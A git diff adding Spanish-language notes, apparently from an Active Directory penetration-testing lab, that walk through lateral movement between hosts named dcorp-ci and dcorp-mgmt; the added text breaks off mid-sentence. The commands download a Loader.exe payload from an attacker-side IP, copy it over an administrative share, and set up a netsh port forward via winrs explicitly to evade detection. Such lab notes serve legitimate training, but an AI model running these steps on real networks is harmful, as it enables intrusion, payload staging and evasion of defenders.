@@ -454,3 +454,17 @@ Nos lo copiamos en *dcorp-ci*
 [dcorp-ci]
 iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
+
+Ahora una vez tenemos *Loader* en *dcorp-ci* deberemos pasarlo a *dcorp-mgmt*
+```shell
+[dcorp-ci]
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+Usando *winrs* agregamos el reenvio de puertos en *dcorp-mgmt*para eveitar la deteccion
+```shell
+[dcorp-ci]
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
+```
+
+Tendremos que usar la variable 
